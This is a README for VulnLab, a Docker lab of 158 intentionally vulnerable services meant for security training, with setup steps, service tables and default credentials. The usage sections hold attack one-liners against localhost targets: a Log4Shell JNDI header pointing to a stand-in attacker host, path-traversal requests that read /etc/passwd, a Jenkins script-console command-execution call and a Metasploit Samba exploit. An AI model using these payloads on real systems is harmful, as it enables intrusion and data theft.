# VulnLab - Vulnerable Applications Laboratory

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)](https://docs.docker.com/compose/)
[![Containers](https://img.shields.io/badge/Containers-158-red)](./docker-compose.yml)
[![Security](https://img.shields.io/badge/Security-Training-orange)](https://owasp.org/)

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [System Requirements](#system-requirements)
- [Installation and Configuration](#installation-and-configuration)
- [Usage Guide](#usage-guide)
- [Service Catalog](#service-catalog)
  - [Vulnerable Web Applications (OWASP/CTF)](#1-vulnerable-web-applications-owaspctf)
  - [Specific CVEs](#2-specific-cves)
  - [CMS and Web Platforms](#3-cms-and-web-platforms)
  - [Databases](#4-databases)
  - [Web and Application Servers](#5-web-and-application-servers)
  - [DevOps and CI/CD](#6-devops-and-cicd)
  - [Messaging and Streaming](#7-messaging-and-streaming)
  - [Monitoring and Logging](#8-monitoring-and-logging)
  - [Network and Infrastructure Services](#9-network-and-infrastructure-services)
  - [Languages and Runtimes](#10-languages-and-runtimes)
  - [Base Operating Systems](#11-base-operating-systems)
- [Use Cases](#use-cases)
- [Integration with Security Tools](#integration-with-security-tools)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview

**VulnLab** is a containerized lab environment with **158 intentionally vulnerable Docker services**, designed for information security professionals, pentesters, students, and researchers.

### Project Goals

| Objective | Description |
|---|---|
| **Penetration Testing** | Safe environment for practicing offensive techniques |
| **Security Training** | Training for Red Team and Blue Team |
| **CVE Studies** | Reproduction and analysis of known vulnerabilities |
| **Scanner Validation** | Testing with OpenVAS, Nessus, Qualys, Nuclei, etc. |
| **CTF Practice** | Realistic scenarios for competitions |
| **Exploit Development** | Research in a controlled environment |
| **DevSecOps** | Integration of security in CI/CD pipelines |

### Key Features

- **158 containers** distributed in 11 categories
- **Isolated network** (`172.30.0.0/15`) for segmentation
- **Binding to localhost** (`127.0.0.1`) for security
- **Unified management** via `lab.sh` script
- **Selective startup** to save resources
- **Compatible with Docker Compose v1 and v2**

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              HOST MACHINE                                   │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │                         Docker Engine                                 │  │
│  │  ┌─────────────────────────────────────────────────────────────────┐  │  │
│  │  │                    vulnnet (172.30.0.0/15)                       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │  │  │
│  │  │   │  Web     │  │ Database │  │ DevOps   │  │ Network  │       │  │  │
│  │  │   │  Apps    │  │ Services │  │ Tools    │  │ Services │       │  │  │
│  │  │   │ (18)     │  │ (16)     │  │ (9)      │  │ (31)     │       │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘  └──────────┘       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │  │  │
│  │  │   │   CMS    │  │ Web      │  │Messaging │  │Monitoring│       │  │  │
│  │  │   │ Platforms│  │ Servers  │  │ Queues   │  │ Logging  │       │  │  │
│  │  │   │ (14)     │  │ (17)     │  │ (8)      │  │ (12)     │       │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘  └──────────┘       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐                      │  │  │
│  │  │   │  CVEs    │  │ Runtimes │  │   OS     │                      │  │  │
│  │  │   │ Specific │  │Languages │  │  Base    │                      │  │  │
│  │  │   │ (5)      │  │ (12)     │  │  (8)     │                      │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘                      │  │  │
│  │  │                                                                  │  │  │
│  │  └─────────────────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Exposed on 127.0.0.1 only (localhost binding)                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Network Configuration

| Parameter | Value |
|---|---|
| **Network Name** | `vulnnet` |
| **Driver** | `bridge` |
| **Subnet** | `172.30.0.0/15` |
| **IP Range** | `172.30.0.1` - `172.31.255.254` |
| **Gateway** | `172.30.0.1` |
| **External Binding** | `127.0.0.1` (localhost only) |

---

## System Requirements

### Minimum

| Resource | Specification |
|---|---|
| **CPU** | 4 cores |
| **RAM** | 8 GB |
| **Disk** | 50 GB free |
| **Docker** | 20.10+ |
| **Docker Compose** | 1.29+ or v2 |
| **OS** | Linux, macOS, Windows (WSL2) |

### Recommended (for all containers)

| Resource | Specification |
|---|---|
| **CPU** | 8+ cores |
| **RAM** | 32 GB |
| **Disk** | 150 GB SSD |
| **Docker** | 24.0+ |
| **Docker Compose** | v2.20+ |

### Prerequisites Check

```bash
# Check Docker version
docker --version

# Check Docker Compose version
docker-compose --version  # v1
docker compose version    # v2

# Check available resources
free -h          # Linux
sysctl hw.memsize # macOS
```

---

## Installation and Configuration

### 1. Clone the Repository

```bash
git clone https://github.com/CristhianKapelinski/LabVulnerabilities.git
cd LabVulnerabilities
```

### 2. Script Permissions

```bash
chmod +x lab.sh
```

### 3. (Optional) Pre-download Images

```bash
# Download all images in advance
./lab.sh pull
```

### 4. Docker Compose v2 Configuration (if needed)

```bash
# Create an alias for compatibility
alias docker-compose=\'docker compose\'

# Or add to ~/.bashrc or ~/.zshrc
echo "alias docker-compose=\'docker compose\'" >> ~/.bashrc
source ~/.bashrc
```

---

## Usage Guide

### Available Commands

| Command | Description | Example |
|---|---|---|
| `./lab.sh start` | Start all containers | `./lab.sh start` |
| `./lab.sh start <srv...>` | Start specific containers | `./lab.sh start dvwa juice-shop` |
| `./lab.sh stop` | Stop all containers | `./lab.sh stop` |
| `./lab.sh restart` | Restart all containers | `./lab.sh restart` |
| `./lab.sh status` | Show status of containers | `./lab.sh status` |
| `./lab.sh logs <srv>` | Display logs of a container | `./lab.sh logs dvwa` |
| `./lab.sh ips` | List IPs of all containers | `./lab.sh ips` |
| `./lab.sh scan-targets` | Show targets for scanners | `./lab.sh scan-targets` |
| `./lab.sh export-targets` | Export IPs to `targets.txt` | `./lab.sh export-targets` |
| `./lab.sh stats` | Show resource usage (CPU/RAM) | `./lab.sh stats` |
| `./lab.sh clean` | Remove containers and volumes | `./lab.sh clean` |
| `./lab.sh pull` | Download all images | `./lab.sh pull` |

### Usage Examples

#### Smoke Test

```bash
# Start only essential web applications
./lab.sh start dvwa juice-shop webgoat

# Check if they are running
./lab.sh status

# Access:
# - DVWA: http://127.0.0.1:8005
# - Juice Shop: http://127.0.0.1:3000
# - WebGoat: http://127.0.0.1:8003/WebGoat
```

#### Database Lab

```bash
# Start all vulnerable databases
./lab.sh start mysql-old mysql55 postgres-old mongodb-noauth redis-noauth

# Connect to MySQL
mysql -h 127.0.0.1 -P 33061 -u root -proot

# Connect to PostgreSQL
psql -h 127.0.0.1 -p 54321 -U postgres

# Connect to MongoDB (no authentication)
mongosh --host 127.0.0.1 --port 27017

# Connect to Redis (no authentication)
redis-cli -h 127.0.0.1 -p 6382
```

#### CVE Lab

```bash
# Start containers with specific CVEs
./lab.sh start log4shell sambacry ssh-cve-2016-6515 tomcat-ghostcat apache-cve-2021-41773

# Log4Shell (CVE-2021-44228)
curl http://127.0.0.1:8883 -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'

# Apache Path Traversal (CVE-2021-41773)
curl http://127.0.0.1:8882/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

---

## Service Catalog

### 1. Vulnerable Web Applications (OWASP/CTF)

Intentionally vulnerable web applications for pentesting, CTF, and OWASP Top 10 training.

| Service | Image | IP | Port | Description |
|---|---|---|---|---|
| `metasploitable2` | `tleemcjr/metasploitable2` | `172.30.1.1` | - | Complete VM with multiple vulnerable services |
| `juice-shop` | `bkimminich/juice-shop` | `172.30.7.1` | `3000:3000` | OWASP Juice Shop - modern vulnerable application |
| `dvwa` | `vulnerables/web-dvwa` | `172.30.9.1` | `8005:80` | Damn Vulnerable Web Application |
| `webgoat` | `webgoat/webgoat` | `172.30.8.1` | `8003:8080` | OWASP WebGoat - interactive tutorials |
| `webgoat-legacy` | `webgoat/webgoat` | `172.30.9.7` | `8011:8080` | Legacy version of WebGoat |
| `hackazon` | `ianwijaya/hackazon` | `172.30.7.2` | `8001:80` | Realistic vulnerable e-commerce |
| `bwapp` | `raesene/bwapp` | `172.30.9.2` | `8006:80` | Buggy Web Application |
| `mutillidae` | `citizenstig/nowasp` | `172.30.9.3` | `8007:80` | OWASP Mutillidae II |
| `railsgoat` | `owasp/railsgoat` | `172.30.8.3` | `3001:3000` | Vulnerable Rails application |
| `security-shepherd` | `ismisepaul/securityshepherd` | `172.30.8.4` | `8004:80` | OWASP Security Shepherd |
| `vampi` | `erev0s/vampi` | `172.30.10.2` | `5002:5000` | Vulnerable API (REST) |
| `damn-vulnerable-graphql` | `dolevf/dvga` | `172.30.10.4` | `5013:5013` | Vulnerable GraphQL API |
| `wackopicko` | `adamdoupe/wackopicko` | `172.30.39.1` | `8040:80` | Vulnerable PHP application |
| `dvna` | `appsecco/dvna` | `172.31.1.104` | `9094:9090` | Damn Vulnerable NodeJS Application |
| `ssrflab` | `youyouorz/ssrf-vulnerable-lab` | `172.31.1.106` | `8109:80` | SSRF Lab |
| `sqli` | `acgpiano/sqli-labs` | `172.31.1.107` | `8110:80` | SQL Injection Labs |
| `httpbin` | `kennethreitz/httpbin` | `172.30.50.1` | `8048:80` | HTTP Request/Response testing |
| `echo-server` | `jmalloc/echo-server` | `172.30.50.3` | `8050:8080` | Echo server for testing |
| `metasploitable3` | `kirscht/metasploitable3-ub1404` | `172.30.1.3` | - | Metasploitable3 Ubuntu 14.04 (SSH, FTP, SMB, HTTP) |
| `metasploitable3-alt` | `heywoodlh/vulnerable` | `172.30.1.4` | `2124:21, 2225:22, 8112:80, 3307:3306` | Alternative Metasploitable3-based host |
| `dsvw` | `appsecco/dsvw` | `172.30.40.1` | `8008:8000` | Damn Small Vulnerable Web (lightweight) |
| `xvwa` | `marcositu/xvwa2020` | `172.30.40.9` | `8108:80` | Xtreme Vulnerable Web Application |
| `bwapp-alt` | `hackersploit/bwapp-docker` | `172.30.9.4` | `8111:80` | bWAPP alternative image |
| `railsgoat-alt` | `vulnerables/web-owasp-railsgoat` | `172.30.8.5` | `3007:80` | RailsGoat alternative image |

**Default Credentials:**

| Application | User | Password |
|---|---|---|
| DVWA | `admin` | `password` |
| WebGoat | `guest` | `guest` |
| bWAPP | `bee` | `bug` |
| Juice Shop | Register new user | - |
| Metasploitable3 | `msfadmin` | `msfadmin` |
| XVWA | - | No authentication |

---

### 2. Specific CVEs

Containers configured to reproduce specific documented CVE vulnerabilities.

| Service | Image | IP | Port | CVE | Severity |
|---|---|---|---|---|---|
| `log4shell` | `ghcr.io/christophetd/log4shell-vulnerable-app` | `172.30.6.4` | `8883:8080` | CVE-2021-44228 | **CRITICAL (10.0)** |
| `sambacry` | `vulnerables/cve-2017-7494` | `172.30.4.1` | `4451:445, 1391:139` | CVE-2017-7494 | **CRITICAL (9.8)** |
| `ssh-cve-2016-6515` | `vulnerables/cve-2016-6515` | `172.30.3.1` | `2222:22` | CVE-2016-6515 | **HIGH (7.5)** |
| `tomcat-ghostcat` | `vulhub/tomcat:9.0.30` | `172.30.44.2` | `8047:8080, 8009:8009` | CVE-2020-1938 | **CRITICAL (9.8)** |
| `apache-cve-2021-41773` | `httpd:2.4.49` | `172.30.6.3` | `8882:80` | CVE-2021-41773 | **CRITICAL (9.8)** |
| `shellshock-lab` | `vulnerables/cve-2014-6271` | `172.30.40.7` | `8104:80` | CVE-2014-6271 | **CRITICAL (9.8)** |
| `heartbleed-lab` | `vulnerables/cve-2014-0160` | `172.30.40.8` | `8105:443` | CVE-2014-0160 | **CRITICAL (9.8)** |

**CVE Details:**

| CVE | Name | Type | Impact |
|---|---|---|---|
| CVE-2021-44228 | Log4Shell | RCE via JNDI Injection | Remote Code Execution |
| CVE-2017-7494 | SambaCry | RCE via Samba | Remote Code Execution |
| CVE-2016-6515 | OpenSSH DoS | DoS via password length | Denial of Service |
| CVE-2020-1938 | Ghostcat | File Read/Include | Sensitive File Read |
| CVE-2021-41773 | Apache Path Traversal | Path Traversal/RCE | File Read/RCE |
| CVE-2014-6271 | Shellshock | Bash Code Injection | Remote Code Execution |
| CVE-2014-0160 | Heartbleed | OpenSSL Memory Leak | Private Key/Data Leak |

---

### 3. CMS and Web Platforms

Content management systems with known vulnerable versions.

| Service | Image | IP | Port | Known Vulnerabilities |
|---|---|---|---|---|
| `wordpress-vuln` | `wordpress:4.6` | `172.30.11.1` | `8015:80` | PHPMailer RCE, REST API |
| `wp46` | `wordpress:4.6` | `172.31.1.82` | `8095:80` | CVE-2016-10033 |
| `wp49` | `wordpress:4.9` | `172.31.1.83` | `8096:80` | Multiple XSS, CSRF |
| `drupal7` | `drupal:7` | `172.31.1.84` | `8097:80` | Drupalgeddon (CVE-2014-3704) |
| `drupal85` | `drupal:8.5` | `172.31.1.85` | `8098:80` | Drupalgeddon 2 (CVE-2018-7600) |
| `joomla38` | `joomla:3.8` | `172.31.1.86` | `8099:80` | SQLi, Object Injection |
| `gitlab-vuln` | `gitlab/gitlab-ce:10.0.0-ce.0` | `172.30.12.2` | `8017:80` | Multiple RCE |
| `owncloud-old` | `owncloud:9.1` | `172.30.31.1` | `8031:80` | CSRF, SQLi |
| `owncloud9` | `owncloud:9` | `172.31.1.92` | `8105:80` | Code Execution |
| `nextcloud12` | `nextcloud:12` | `172.31.1.93` | `8106:80` | SSRF, SQLi |
| `mediawiki-old` | `mediawiki:1.27` | `172.30.32.1` | `8033:80` | XSS, RCE |
| `mediawiki128` | `mediawiki:1.28` | `172.31.1.94` | `8107:80` | Multiple vulnerabilities |
| `redmine33` | `redmine:3.3` | `172.31.1.95` | `3006:3000` | XSS, CSRF |
| `dokuwiki` | `mprasil/dokuwiki` | `172.30.32.2` | `8034:80` | Auth Bypass, RCE |

---

### 4. Databases

DBMS with outdated versions, insecure configurations, or no authentication.

| Service | Image | IP | Port | Vulnerability |
|---|---|---|---|---|
| `mysql-old` | `mysql:5.5` | `172.30.14.1` | `33061:3306` | EOL version, multiple CVEs |
| `mysql55` | `mysql:5.5` | `172.31.1.25` | `33062:3306` | CVE-2012-2122 (auth bypass) |
| `mysql56` | `mysql:5.6` | `172.31.1.26` | `33063:3306` | Privilege escalation |
| `mariadb10` | `mariadb:10.0` | `172.31.1.27` | `33064:3306` | Outdated version |
| `postgres-old` | `postgres:9.4` | `172.30.14.2` | `54321:5432` | CVE-2019-9193 |
| `pg93` | `postgres:9.3` | `172.31.1.28` | `54322:5432` | Multiple CVEs |
| `pg95` | `postgres:9.5` | `172.31.1.29` | `54323:5432` | Privilege escalation |
| `mongodb-noauth` | `mongo:3.4` | `172.30.14.3` | `27017:27017` | **No authentication** |
| `mongo32` | `mongo:3.2` | `172.31.1.30` | `27018:27017` | EOL version |
| `mongo36` | `mongo:3.6` | `172.31.1.31` | `27019:27017` | Outdated version |
| `redis-noauth` | `redis:4.0` | `172.30.14.4` | `6382:6379` | **No authentication** |
| `redis32` | `redis:3.2` | `172.31.1.32` | `6380:6379` | CVE-2015-8080 |
| `redis50` | `redis:5.0` | `172.31.1.33` | `6381:6379` | Lua sandbox escape |
| `cassandra22` | `cassandra:2.2` | `172.31.1.34` | `9043:9042` | EOL version |
| `couchdb-old` | `couchdb:1.6` | `172.30.14.6` | `5984:5984` | CVE-2017-12635/12636 |
| `couchdb16` | `couchdb:1.6` | `172.31.1.35` | `5985:5984` | Privilege escalation |

**Default Credentials:**

| Database | User | Password | Environment Variable |
|---|---|---|---|
| MySQL | `root` | `root` | `MYSQL_ROOT_PASSWORD=root` |
| PostgreSQL | `postgres` | `postgres` | `POSTGRES_PASSWORD=postgres` |
| MongoDB | - | - | No authentication |
| Redis | - | - | No authentication |

---

### 5. Web and Application Servers

HTTP and application servers with known vulnerabilities.

| Service | Image | IP | Port | Vulnerabilities |
|---|---|---|---|---|
| `apache-old` | `httpd:2.2` | `172.30.15.2` | `8021:80` | CVE-2017-3167, CVE-2017-3169 |
| `apache22` | `httpd:2.2` | `172.31.1.9` | `8150:80` | Multiple EOL CVEs |
| `apache246` | `httpd:2.4.6` | `172.31.1.10` | `8051:80` | CVE-2017-15710 |
| `nginx-old` | `nginx:1.10` | `172.30.15.1` | `8020:80` | Outdated version |
| `nginx110` | `nginx:1.10` | `172.31.1.11` | `8152:80` | CVE-2017-7529 |
| `nginx112` | `nginx:1.12` | `172.31.1.12` | `8153:80` | Integer overflow |
| `nginx114` | `nginx:1.14` | `172.31.1.13` | `8154:80` | HTTP/2 vulnerabilities |
| `lighttpd` | `sebp/lighttpd` | `172.31.1.14` | `8055:80` | Outdated version |
| `caddy20` | `caddy:2.0.0` | `172.31.1.15` | `8155:80` | Early version bugs |
| `tomcat6` | `tomcat:6` | `172.31.1.16` | `8060:8080` | **EOL** - multiple RCE |
| `tomcat7` | `tomcat:7.0.70` | `172.31.1.17` | `8061:8080` | CVE-2017-12617 (RCE) |
| `tomcat7-vuln` | `tomcat:7.0.94` | `172.30.44.1` | `8046:8080` | Manager app exposed |
| `tomcat8` | `tomcat:8.0` | `172.31.1.18` | `8062:8080` | Deserialization RCE |
| `jboss7` | `jboss/wildfly:8.2.1.Final` | `172.31.1.20` | `8064:8080` | JMX Console exposed |
| `wildfly9` | `jboss/wildfly:9.0.2.Final` | `172.31.1.21` | `8065:8080` | Deserialization |
| `wildfly10` | `jboss/wildfly:10.1.0.Final` | `172.31.1.22` | `8066:8080` | Admin console vulns |
| `glassfish41` | `oracle/glassfish:4.1` | `172.31.1.24` | `8067:8080, 4848:4848` | Admin auth bypass |

---

### 6. DevOps and CI/CD

Continuous integration and code repository tools with vulnerabilities.

| Service | Image | IP | Port | Vulnerabilities |
|---|---|---|---|---|
| `jenkins260` | `jenkins/jenkins:2.60` | `172.31.1.48` | `8080:8080` | Deserialization RCE, Script Console |
| `jenkins2150` | `jenkins/jenkins:2.150` | `172.31.1.49` | `8081:8080` | CVE-2019-1003000 |
| `gitlab10` | `gitlab/gitlab-ce:10.0.0-ce.0` | `172.31.1.55` | `8085:80` | Multiple RCE |
| `nexus2` | `sonatype/nexus:2.14.4` | `172.31.1.50` | `8082:8081` | EL Injection RCE |
| `sonar67` | `sonarqube:6.7` | `172.31.1.52` | `9001:9000` | Auth bypass |
| `sonar70` | `sonarqube:7.0` | `172.31.1.53` | `9002:9000` | API vulnerabilities |
| `artifactory5` | `jfrog/artifactory-oss:5.11.0` | `172.31.1.54` | `8084:8081` | Path traversal |
| `gogs011` | `gogs/gogs:0.11` | `172.31.1.56` | `3002:3000` | CVE-2018-18925 (RCE) |
| `gitea14` | `gitea/gitea:1.4.0` | `172.31.1.57` | `3010:3000` | SSRF, XSS |

**Default Credentials:**

| Service | User | Password |
|---|---|---|
| Jenkins | - | Initial no auth |
| Nexus | `admin` | `admin123` |
| SonarQube | `admin` | `admin` |
| GitLab | `root` | Configure on first access |

---

### 7. Messaging and Streaming

Message brokers and data streaming systems.

| Service | Image | IP | Port | Vulnerabilities |
|---|---|---|---|---|
| `rabbitmq-old` | `rabbitmq:3.6-management` | `172.30.20.1` | `5672:5672, 15672:15672` | Default creds |
| `rabbit36` | `rabbitmq:3.6-management` | `172.31.1.58` | `5673:5672, 15673:15672` | CVE-2017-4966 |
| `rabbit37` | `rabbitmq:3.7-management` | `172.31.1.59` | `5674:5672, 15674:15672` | MQTT vulnerabilities |
| `kafka-old` | `wurstmeister/kafka:2.11-0.10.2.2` | `172.30.47.1` | `9092:9092` | No authentication |
| `kafka011` | `wurstmeister/kafka:2.11-0.11.0.3` | `172.31.1.60` | `9093:9092` | CVE-2018-1288 |
| `activemq-old` | `rmohr/activemq:5.14.3` | `172.30.20.2` | `61616:61616, 8161:8161` | Deserialization RCE |
| `activemq514` | `rmohr/activemq:5.14.3` | `172.31.1.61` | `61617:61616, 8162:8161` | CVE-2016-3088 |
| `zookeeper-old` | `zookeeper:3.4` | `172.30.46.1` | `2181:2181` | No authentication |

**Default Credentials:**

| Service | User | Password | Console |
|---|---|---|---|
| RabbitMQ | `guest` | `guest` | `:15672` |
| ActiveMQ | `admin` | `admin` | `:8161` |

---

### 8. Monitoring and Logging

Observability, metrics, and logging systems.

| Service | Image | IP | Port | Vulnerabilities |
|---|---|---|---|---|
| `elasticsearch-old` | `elasticsearch:2.4.6` | `172.30.14.5` | `9200:9200, 9300:9300` | CVE-2015-1427 (RCE) |
| `es24` | `elasticsearch:2.4` | `172.31.1.64` | `9201:9200` | Groovy scripting RCE |
| `es56` | `elasticsearch:5.6` | `172.31.1.65` | `9202:9200` | Directory traversal |
| `kibana-old` | `kibana:4.6` | `172.30.19.1` | `5601:5601` | Prototype pollution |
| `kibana46` | `kibana:4.6` | `172.31.1.67` | `5602:5601` | CVE-2017-11479 |
| `kibana56` | `kibana:5.6` | `172.31.1.68` | `5603:5601` | LFI vulnerability |
| `logstash56` | `logstash:5.6` | `172.31.1.69` | `5045:5044` | Deserialization |
| `grafana-old` | `grafana/grafana:5.1.0` | `172.30.19.2` | `3003:3000` | CVE-2018-15727 (Auth bypass) |
| `prometheus-old` | `prom/prometheus:v2.15.2` | `172.31.1.72` | `9091:9090` | SSRF via config reload |
| `influx13` | `influxdb:1.3` | `172.31.1.73` | `8087:8086` | Auth bypass |
| `nagios` | `jasonrivers/nagios` | `172.31.1.74` | `8088:80` | Command injection |
| `zabbix40` | `zabbix/zabbix-server-mysql` | `172.31.1.75` | `10052:10051` | SQLi, RCE |

**Default Credentials:**

| Service | User | Password |
|---|---|---|
| Grafana | `admin` | `admin` |
| Nagios | `nagiosadmin` | `nagios` |
| Kibana | - | No auth |

---

### 9. Network and Infrastructure Services

Network protocols, proxy, DNS, LDAP, cache, and other infrastructure services.

| Service | Image | IP | Port | Vulnerabilities |
|---|---|---|---|---|
| `proftpd-vuln` | `infosecwarrior/ftp:v1` | `172.30.2.2` | `2122:21` | Backdoor, mod_copy |
| `ubuntu-sshd-old` | `rastasheep/ubuntu-sshd:14.04` | `172.30.3.2` | `2223:22` | Weak config |
| `openssh` | `linuxserver/openssh-server` | `172.31.1.96` | `2224:22` | Config testing |
| `vsftpd` | `fauria/vsftpd` | `172.31.1.97` | `2123:21` | Anonymous upload |
| `dns-vuln` | `infosecwarrior/dns-lab:v2` | `172.30.5.1` | `5353:53/udp, 8053:80` | Zone transfer |
| `bind` | `sameersbn/bind:9.11.3` | `172.31.1.101` | `5354:53/udp` | Outdated version |
| `openldap` | `osixia/openldap:1.2.0` | `172.30.29.1` | `3891:389, 6361:636` | Anonymous bind |
| `phpldapadmin` | `osixia/phpldapadmin:0.7.1` | `172.30.29.2` | `8030:80` | XSS, Injection |
| `mailcatcher` | `schickling/mailcatcher` | `172.30.17.1` | `1025:1025, 1080:1080` | Open relay testing |
| `dovecot` | `dovecot/dovecot` | `172.31.1.100` | `1431:143` | Config testing |
| `squid-old` | `sameersbn/squid:3.3.8-23` | `172.30.18.1` | `3128:3128` | CVE-2014-0128 |
| `squid35` | `sameersbn/squid:3.5.27-2` | `172.31.1.79` | `3129:3128` | Cache poisoning |
| `haproxy15` | `haproxy:1.5` | `172.31.1.76` | `8090:80` | HTTP desync |
| `haproxy16` | `haproxy:1.6` | `172.31.1.77` | `8091:80` | Buffer overflow |
| `haproxy17` | `haproxy:1.7` | `172.31.1.78` | `8092:80` | CVE-2018-14645 |
| `traefik15` | `traefik:1.5` | `172.31.1.80` | `8093:80` | API exposure |
| `docker-registry-noauth` | `registry:2` | `172.30.21.1` | `5000:5000` | **No authentication** |
| `memcached-old` | `memcached:1.4` | `172.30.25.1` | `11211:11211` | DDoS amplification |
| `memcached14` | `memcached:1.4` | `172.31.1.102` | `11212:11211` | CVE-2016-8704 |
| `memcached15` | `memcached:1.5` | `172.31.1.103` | `11213:11211` | Auth bypass |
| `snmpd` | `polinux/snmpd` | `172.30.30.1` | `1611:161/udp` | Default community strings |
| `asterisk` | `andrius/asterisk` | `172.30.28.1` | `5060:5060/udp` | SIP vulnerabilities |
| `consul-old` | `consul:0.9.0` | `172.30.48.1` | `8500:8500, 8600:8600/udp` | RCE via services |
| `vault-old` | `vault:0.9.0` | `172.30.49.1` | `8200:8200` | Auth bypass |
| `solr-old` | `solr:6.6` | `172.30.45.1` | `8983:8983` | CVE-2017-12629 (RCE) |
| `phpmyadmin-old` | `phpmyadmin:4.6` | `172.30.26.1` | `8026:80` | LFI, XSS |
| `pma46` | `phpmyadmin:4.6` | `172.31.1.88` | `8101:80` | CVE-2016-5703 |
| `pma48` | `phpmyadmin:4.8` | `172.31.1.89` | `8102:80` | CVE-2018-12613 (LFI) |
| `adminer` | `adminer:4.2` | `172.30.26.2` | `8027:8080` | SSRF |
| `adminer42` | `adminer:4.2` | `172.31.1.90` | `8103:8080` | Login bypass |
| `phpldapadmin-remote-dump` | `vulnerables/phpldapadmin-remote-dump` | `172.30.40.5` | `8094:80` | RCE via LDAP dump (CVE) |
| `metasploit-emulator` | `vulnerables/metasploit-vulnerability-emulator` | `172.30.40.6` | `8100:80` | Emulates 100+ vulnerable services |

---

### 10. Languages and Runtimes

Execution environments with outdated versions for testing vulnerable dependencies.

| Service | Image | IP | Port | EOL/Vulnerabilities |
|---|---|---|---|---|
| `python27` | `python:2.7` | `172.31.1.36` | - | **EOL** - Jan 2020 |
| `python35` | `python:3.5` | `172.31.1.37` | - | **EOL** - Sep 2020 |
| `python36` | `python:3.6` | `172.31.1.38` | - | **EOL** - Dec 2021 |
| `node6` | `node:6` | `172.31.1.39` | - | **EOL** - Apr 2019 |
| `node8` | `node:8` | `172.31.1.40` | - | **EOL** - Dec 2019 |
| `node10` | `node:10` | `172.31.1.41` | - | **EOL** - Apr 2021 |
| `ruby23` | `ruby:2.3` | `172.31.1.42` | - | **EOL** - Mar 2019 |
| `ruby24` | `ruby:2.4` | `172.31.1.43` | - | **EOL** - Apr 2020 |
| `php56` | `php:5.6-apache` | `172.31.1.44` | `8070:80` | **EOL** - Dec 2018 |
| `php70` | `php:7.0-apache` | `172.31.1.45` | `8071:80` | **EOL** - Jan 2019 |
| `go19` | `golang:1.9` | `172.31.1.46` | - | Outdated version |
| `express-old` | `node:6.14` | `172.30.22.2` | `3004:3000` | Multiple CVEs |

---

### 11. Base Operating Systems

Outdated OS images for testing kernel and system vulnerabilities.

| Service | Image | IP | Port | EOL |
|---|---|---|---|---|
| `ubuntu14` | `ubuntu:14.04` | `172.31.1.1` | - | **Apr 2019** |
| `ubuntu16` | `ubuntu:16.04` | `172.31.1.2` | - | **Apr 2021** |
| `debian8` | `debian:jessie` | `172.31.1.3` | - | **Jun 2020** |
| `debian9` | `debian:stretch` | `172.31.1.4` | - | **Jun 2022** |
| `centos6` | `centos:6` | `172.31.1.5` | - | **Nov 2020** |
| `centos7` | `centos:7` | `172.31.1.6` | - | **Jun 2024** |
| `alpine37` | `alpine:3.7` | `172.31.1.7` | - | **Nov 2019** |
| `fedora28` | `fedora:28` | `172.31.1.8` | - | **May 2019** |

---

## Use Cases

### 1. OWASP Top 10 Training

```bash
# Start complete OWASP environment
./lab.sh start dvwa juice-shop webgoat bwapp

# Practice:
# A01 - Broken Access Control: Juice Shop
# A02 - Cryptographic Failures: DVWA
# A03 - Injection: SQLi Labs, DVWA
# A07 - XSS: bWAPP, Mutillidae
```

### 2. Infrastructure Pentest

```bash
# Complete network environment
./lab.sh start metasploitable2 proftpd-vuln ssh-cve-2016-6515 sambacry \
              mysql-old postgres-old mongodb-noauth redis-noauth

# Run Nmap
nmap -sV -sC 172.30.0.0/16

# Use Metasploit
msfconsole
use exploit/multi/samba/usermap_script
```

### 3. CVE Analysis

```bash
# Critical CVEs lab
./lab.sh start log4shell apache-cve-2021-41773 tomcat-ghostcat sambacry

# Reproduce Log4Shell
curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}' http://127.0.0.1:8883

# Reproduce Apache Path Traversal
curl 'http://127.0.0.1:8882/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'
```

### 4. DevSecOps Pipeline Testing

```bash
# Vulnerable CI/CD tools
./lab.sh start jenkins260 gitlab10 nexus2 sonar67 docker-registry-noauth

# Test Jenkins Script Console
curl -X POST 'http://127.0.0.1:8080/scriptText' \
     --data-urlencode 'script=println "id".execute().text'
```

---

## Integration with Security Tools

### OpenVAS (Greenbone Vulnerability Management)

OpenVAS is an open-source vulnerability scanner. This guide shows how to run OpenVAS in Docker and scan the VulnLab containers.

#### Step 1: Start OpenVAS in a Container

```bash
# Create a volume for data persistence
docker volume create openvas

# Start the OpenVAS container
# IMPORTANT: Set a strong password for the admin
docker run --detach \
  --publish 8080:9392 \
  -e PASSWORD="YourSecurePassword123" \
  --volume openvas:/data \
  --name openvas \
  immauss/openvas

# Wait for initialization (can take 5-10 minutes the first time)
# Follow the logs:
docker logs -f openvas

# When "Greenbone Vulnerability Manager started" appears, it's ready
```

> **Note:** The first startup downloads vulnerability definitions (~1.5GB) and can take several minutes.

#### Step 2: Connect OpenVAS to the VulnLab Network

For OpenVAS to be able to scan the VulnLab containers, it needs to be connected to the same network (`vulnnet`).

```bash
# Check the VulnLab network name
docker network ls | grep vuln
# Output: xxxxxxxxxxxx   trabalho_vulnnet   bridge    local

# Connect the OpenVAS container to the vulnnet network
docker network connect trabalho_vulnnet openvas

# Verify the connection
docker inspect openvas | grep -A 10 "Networks"

# Test connectivity (from inside OpenVAS)
docker exec openvas ping -c 2 172.30.9.1  # DVWA's IP
```

